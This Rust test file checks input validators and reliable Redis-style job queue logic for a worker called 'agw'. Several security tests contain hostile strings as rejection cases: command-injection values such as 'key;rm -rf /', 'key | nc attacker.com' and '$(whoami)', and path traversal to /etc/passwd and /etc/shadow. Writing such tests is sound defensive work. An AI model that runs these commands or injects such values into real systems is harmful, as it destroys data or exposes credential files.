use agw::config::{validate_session_key, validate_worker_id};

#[test]
fn test_session_key_security_validation() {
    // Valid keys
    assert!(validate_session_key("valid-key-12345").is_ok());
    assert!(validate_session_key("another_valid_key").is_ok());
    assert!(validate_session_key("UPPERCASE_KEY_123").is_ok());

    // Empty key
    assert!(validate_session_key("").is_err());

    // Too short
    assert!(validate_session_key("short").is_err());

    // Path traversal attempts
    assert!(validate_session_key("../../../etc/passwd").is_err());
    assert!(validate_session_key("..\\..\\..\\windows\\system32").is_err());
    assert!(validate_session_key("/etc/shadow").is_err());

    // Command injection attempts
    assert!(validate_session_key("key;rm -rf /").is_err());
    assert!(validate_session_key("key && whoami").is_err());
    assert!(validate_session_key("key || cat /etc/passwd").is_err());
    assert!(validate_session_key("key | nc attacker.com").is_err());
    assert!(validate_session_key("key$(whoami)test").is_err());
    assert!(validate_session_key("key`id`test").is_err());
    assert!(validate_session_key("key$((1+1))").is_err());
}

#[test]
fn test_worker_id_security_validation() {
    // Valid IDs
    assert!(validate_worker_id("worker-1").is_ok());
    assert!(validate_worker_id("worker_test_123").is_ok());
    assert!(validate_worker_id("WORKER123").is_ok());
    assert!(validate_worker_id("agw-550e8400-e29b-41d4-a716-446655440000").is_ok());

    // Empty ID
    assert!(validate_worker_id("").is_err());

    // Too long
    let long_id = "a".repeat(65);
    assert!(validate_worker_id(&long_id).is_err());

    // Invalid characters
    assert!(validate_worker_id("worker.1").is_err());
    assert!(validate_worker_id("worker@host").is_err());
    assert!(validate_worker_id("worker#1").is_err());
    assert!(validate_worker_id("worker/1").is_err());
    assert!(validate_worker_id("worker\\1").is_err());
    assert!(validate_worker_id("worker;rm -rf /").is_err());
    assert!(validate_worker_id("worker|cat").is_err());
    assert!(validate_worker_id("worker&whoami").is_err());
    assert!(validate_worker_id("worker$test").is_err());
    assert!(validate_worker_id("worker`id`").is_err());
}

#[test]
fn test_config_validation_edge_cases() {
    // Test various edge cases for configuration validation

    // Boundary conditions for key length
    assert!(validate_session_key("12345678").is_ok()); // Exactly 8 chars
    assert!(validate_session_key("1234567").is_err()); // One less than minimum

    // Boundary conditions for worker ID length
    let max_valid_id = "a".repeat(64);
    assert!(validate_worker_id(&max_valid_id).is_ok());

    let one_over_max = "a".repeat(65);
    assert!(validate_worker_id(&one_over_max).is_err());
}

#[test]
fn test_unicode_and_special_input_handling() {
    // Unicode characters should be rejected
    assert!(validate_session_key("key\u{0000}test").is_err()); // Null byte
    assert!(validate_worker_id("worker\u{202e}test").is_err()); // Right-to-left override

    // Whitespace handling
    assert!(validate_worker_id("worker test").is_err()); // Space
    assert!(validate_worker_id("worker\ttest").is_err()); // Tab
    assert!(validate_worker_id("worker\ntest").is_err()); // Newline
}

#[test]
fn test_job_result_key_format_security() {
    // Test that job IDs are properly formatted into keys
    let job_id = "job-123";

    // Valid key format
    let stdout_key = format!("job:{}:stdout", job_id);
    assert_eq!(stdout_key, "job:job-123:stdout");

    // Ensure no special characters in job ID would break key format
    let malicious_job_id = "job;rm -rf /";
    let malformed_key = format!("job:{}:stdout", malicious_job_id);
    // The key format itself is safe, but AGQ should validate job IDs
    assert!(malformed_key.contains(';'));

    // Test key format with valid UUID-style job ID
    let uuid_job_id = "550e8400-e29b-41d4-a716-446655440000";
    let valid_key = format!("job:{}:stdout", uuid_job_id);
    assert_eq!(valid_key, "job:550e8400-e29b-41d4-a716-446655440000:stdout");
}

#[test]
fn test_job_status_validation() {
    // Valid statuses
    let valid_statuses = vec!["completed", "failed", "pending", "running"];
    for status in valid_statuses {
        assert!(matches!(
            status,
            "completed" | "failed" | "pending" | "running"
        ));
    }

    // Invalid statuses that should be rejected
    let invalid_statuses = vec![
        "invalid",
        "COMPLETED", // Case sensitive
        "complete",
        "error",
        "success",
        "done",
        "",
        "failed; rm -rf /", // Injection attempt
    ];

    for status in invalid_statuses {
        assert!(!matches!(
            status,
            "completed" | "failed" | "pending" | "running"
        ));
    }
}

#[test]
fn test_result_data_sanitization() {
    // Test that result data with special characters is handled safely
    let test_cases = vec![
        ("Normal output\n", "Normal output\n"),
        (
            "Output with\ntabs\tand spaces",
            "Output with\ntabs\tand spaces",
        ),
        ("", ""), // Empty output
    ];

    for (input, expected) in test_cases {
        // The data is stored as-is, no sanitization needed for content
        // Security is handled at the protocol level by RESP encoding
        assert_eq!(input, expected);
    }

    // Test that combining multiple task outputs works correctly
    let task_outputs = ["task1\n", "task2\n", "task3\n"];
    let combined = task_outputs.join("\n");
    assert_eq!(combined, "task1\n\ntask2\n\ntask3\n");
}

#[test]
fn test_large_output_handling() {
    // Test that large outputs are handled correctly
    let large_output = "x".repeat(1_000_000); // 1MB of data
    assert_eq!(large_output.len(), 1_000_000);

    // Ensure we can format it into a key without panic
    let job_id = "job-123";
    let _key = format!("job:{}:stdout", job_id);

    // The actual storage limit is handled by AGQ/Redis
}

#[test]
fn test_error_message_format() {
    // Test that error messages are formatted correctly
    let error = "Execution error: Command not found";
    let formatted = format!("Execution error: {}", "Command not found");
    assert_eq!(error, formatted);

    // Error messages should not contain sensitive data
    let safe_error = "Execution error: Failed to spawn command";
    assert!(!safe_error.contains("password"));
    assert!(!safe_error.contains("secret"));
    assert!(!safe_error.contains("token"));
}

#[test]
fn test_job_id_injection_prevention() {
    // Test that malicious job IDs would be rejected
    let malicious_job_ids = vec![
        "job:123",        // Simple colon injection
        "job-123:status", // Attempting to collide with status key
        "abc:def:ghi",    // Multiple colons
        ":leading",       // Leading colon
        "trailing:",      // Trailing colon
        "",               // Empty job ID
    ];

    for job_id in malicious_job_ids {
        // These should all fail validation
        let is_valid = !job_id.is_empty() && !job_id.contains(':');
        assert!(!is_valid, "Job ID '{}' should be invalid", job_id);
    }
}

#[test]
fn test_valid_job_id_formats() {
    // Test that valid job IDs pass validation
    let valid_job_ids = vec![
        "job-123",
        "550e8400-e29b-41d4-a716-446655440000", // UUID format
        "job_with_underscores",
        "JOB-UPPERCASE-123",
        "plan-abc-123",
        "test-job-001",
    ];

    for job_id in valid_job_ids {
        // These should all pass validation
        let is_valid = !job_id.is_empty() && !job_id.contains(':');
        assert!(is_valid, "Job ID '{}' should be valid", job_id);
    }
}

#[test]
fn test_key_collision_prevention() {
    // Demonstrate why colon validation is critical
    let malicious_job_id = "job-123:status";

    // Without validation, this would create a malformed key
    let malformed_key = format!("job:{}:stdout", malicious_job_id);
    assert_eq!(malformed_key, "job:job-123:status:stdout");

    // This could collide with the status key structure
    // Validation prevents this by rejecting job IDs with colons
    assert!(malicious_job_id.contains(':'));
}

#[test]
fn test_tool_registration_format() {
    // Test tool list serialization format
    let tools = [
        "sort".to_string(),
        "grep".to_string(),
        "agx-ocr".to_string(),
    ];
    let serialized = tools.join(",");
    assert_eq!(serialized, "sort,grep,agx-ocr");

    // Test deserialization
    let deserialized: Vec<&str> = serialized.split(',').collect();
    assert_eq!(deserialized, vec!["sort", "grep", "agx-ocr"]);
}

#[test]
fn test_tool_name_validation() {
    // Valid tool names (alphanumeric, hyphens, underscores)
    let valid_tools = vec!["sort", "grep", "agx-ocr", "tool_name", "TOOL123"];

    for tool in valid_tools {
        assert!(tool
            .chars()
            .all(|c| c.is_alphanumeric() || c == '-' || c == '_'));
    }

    // Invalid tool names (should be rejected in real implementation)
    let invalid_tools = vec![
        "tool;injection",
        "tool|pipe",
        "tool&background",
        "../etc/passwd",
    ];

    for tool in invalid_tools {
        assert!(!tool
            .chars()
            .all(|c| c.is_alphanumeric() || c == '-' || c == '_'));
    }
}

#[test]
fn test_empty_tools_list_handling() {
    // Empty tools list should result in empty string
    let empty_tools: Vec<String> = vec![];
    let serialized = empty_tools.join(",");
    assert_eq!(serialized, "");

    // Worker should handle empty tools gracefully (no registration)
    assert!(empty_tools.is_empty());
}

#[test]
fn test_tool_key_format_consistency() {
    // Ensure worker tools key follows AGQ keyspace conventions
    let worker_id = "worker-123";
    let tools_key = format!("worker:{}:tools", worker_id);
    let alive_key = format!("worker:{}:alive", worker_id);

    // Both should follow same pattern: worker:<id>:<attribute>
    assert!(tools_key.starts_with("worker:"));
    assert!(alive_key.starts_with("worker:"));
    assert!(tools_key.ends_with(":tools"));
    assert!(alive_key.ends_with(":alive"));
}

#[test]
fn test_shutdown_flag_behavior() {
    // Test shutdown flag logic
    let mut shutdown_requested = false;
    let current_job_running = false;

    // Before shutdown: should fetch jobs
    assert!(!shutdown_requested);
    let should_fetch = !shutdown_requested && !current_job_running;
    assert!(should_fetch);

    // After shutdown request with no job: should exit
    shutdown_requested = true;
    let should_exit = shutdown_requested && !current_job_running;
    assert!(should_exit);

    // After shutdown request with job running: should NOT exit yet
    let current_job_running = true;
    let should_exit = shutdown_requested && !current_job_running;
    assert!(!should_exit);

    // Job completes: now should exit
    let current_job_running = false;
    let should_exit = shutdown_requested && !current_job_running;
    assert!(should_exit);
}

#[test]
fn test_shutdown_prevents_new_jobs() {
    // Simulates the shutdown logic
    let shutdown_requested = true;
    let current_job_running = false;

    // Should not fetch new jobs when shutdown is requested
    let should_fetch_new_job = !shutdown_requested && !current_job_running;
    assert!(!should_fetch_new_job);
}

#[test]
fn test_graceful_shutdown_with_job() {
    // Simulates graceful shutdown behavior
    let mut job_running = true;

    // Shutdown signal received
    let shutdown_requested = true;

    // Job still running - should not exit
    assert!(shutdown_requested && job_running);

    // Job completes
    job_running = false;

    // Now should exit
    assert!(shutdown_requested && !job_running);
}

#[test]
fn test_brpoplpush_reliable_job_fetch() {
    // Test reliable job processing with BRPOPLPUSH
    // This simulates the atomic job acquisition flow

    let job_json = r#"{"job_id":"test-123","plan_id":"plan-abc","tasks":[]}"#;

    // Step 1: Job starts in queue:ready
    let mut ready_queue = vec![job_json];
    let mut processing_queue: Vec<&str> = vec![];

    // Step 2: BRPOPLPUSH atomically moves job from ready to processing
    if let Some(job) = ready_queue.pop() {
        processing_queue.push(job);
    }

    // Verify atomic operation
    assert!(
        ready_queue.is_empty(),
        "Job should be removed from ready queue"
    );
    assert_eq!(
        processing_queue.len(),
        1,
        "Job should be in processing queue"
    );
    assert_eq!(
        processing_queue[0], job_json,
        "Job content should be preserved"
    );
}

#[test]
fn test_lrem_cleanup_after_success() {
    // Test LREM cleanup after successful job completion
    let job_json = r#"{"job_id":"test-456","plan_id":"plan-def","tasks":[]}"#;

    // Job is in processing queue after BRPOPLPUSH
    let mut processing_queue = vec![job_json];

    // Job completes successfully
    let job_succeeded = true;

    // Step 3: LREM removes job from processing queue
    if job_succeeded {
        // Simulate LREM with count=1 (remove first occurrence)
        if let Some(pos) = processing_queue.iter().position(|&x| x == job_json) {
            processing_queue.remove(pos);
        }
    }

    // Verify cleanup
    assert!(
        processing_queue.is_empty(),
        "Processing queue should be empty after successful cleanup"
    );
}

#[test]
fn test_job_remains_in_processing_on_crash() {
    // Test that job remains in processing queue if worker crashes
    let job_json = r#"{"job_id":"crash-789","plan_id":"plan-ghi","tasks":[]}"#;

    // Job moved to processing queue
    let processing_queue = vec![job_json];

    // Worker crashes before LREM can be called
    let worker_crashed = true;
    let lrem_called = false;

    // Verify job is NOT lost
    if worker_crashed && !lrem_called {
        // Job remains in queue for monitoring/retry
        assert!(
            !processing_queue.is_empty(),
            "Job should remain in processing queue"
        );
        assert_eq!(
            processing_queue[0], job_json,
            "Job data should be intact for retry"
        );
    }
}

#[test]
fn test_reliable_queue_pattern_vs_brpop() {
    // Compare BRPOP (unreliable) vs BRPOPLPUSH (reliable)

    // BRPOP scenario (old, unreliable)
    let job = "job1";
    let mut ready_queue_brpop = vec![job];

    // BRPOP removes from queue
    let fetched_job = ready_queue_brpop.pop();
    assert!(fetched_job.is_some());
    assert!(ready_queue_brpop.is_empty());
    // If crash happens here, job is LOST!

    // BRPOPLPUSH scenario (new, reliable)
    let job = "job2";
    let mut ready_queue = vec![job];
    let mut processing_queue: Vec<&str> = vec![];

    // BRPOPLPUSH atomically moves to processing
    if let Some(job) = ready_queue.pop() {
        processing_queue.push(job);
    }

    // If crash happens here, job is in processing_queue (NOT LOST!)
    assert!(
        !processing_queue.is_empty(),
        "Job remains in processing queue"
    );
}

#[test]
fn test_multiple_workers_brpoplpush_safety() {
    // Test that BRPOPLPUSH prevents race conditions with multiple workers
    let jobs = vec!["job1", "job2", "job3"];
    let mut ready_queue = jobs;
    let mut worker1_processing: Vec<&str> = vec![];
    let mut worker2_processing: Vec<&str> = vec![];

    // Worker 1 fetches a job atomically
    if let Some(job) = ready_queue.pop() {
        worker1_processing.push(job);
    }

    // Worker 2 fetches a different job atomically
    if let Some(job) = ready_queue.pop() {
        worker2_processing.push(job);
    }

    // Verify no overlap (atomic operation guarantees)
    assert_ne!(
        worker1_processing[0], worker2_processing[0],
        "Workers should get different jobs"
    );
    assert_eq!(ready_queue.len(), 1, "One job should remain in queue");
}

#[test]
fn test_lrem_count_parameter_behavior() {
    // Test LREM count parameter expectations
    let job = "test-job";
    let mut queue = vec![job, job, job]; // 3 identical jobs

    // count = 1: Remove only first occurrence (what AGW uses)
    let count = 1;
    for _ in 0..count {
        if let Some(pos) = queue.iter().position(|&x| x == job) {
            queue.remove(pos);
        }
    }

    assert_eq!(queue.len(), 2, "Should remove only 1 occurrence");

    // count = 0 would remove all (we don't use this)
    // count = -1 would remove from tail (we don't use this)
}

#[test]
fn test_job_result_posting_before_lrem() {
    // Test that we only call LREM after successfully posting results
    let job_json = r#"{"job_id":"result-test","plan_id":"test","tasks":[]}"#;
    let mut processing_queue = vec![job_json];

    // Job completes
    let job_completed = true;

    // Try to post results
    let result_posted_successfully = true; // Simulated

    // Only remove from queue if results posted successfully
    if job_completed && result_posted_successfully {
        processing_queue.clear();
    }

    assert!(
        processing_queue.is_empty(),
        "Should only cleanup after successful result posting"
    );

    // Failure scenario
    let mut processing_queue = vec![job_json];
    let result_posted_successfully = false; // Simulated failure

    if job_completed && result_posted_successfully {
        processing_queue.clear();
    }

    assert!(
        !processing_queue.is_empty(),
        "Should NOT cleanup if result posting failed"
    );
}
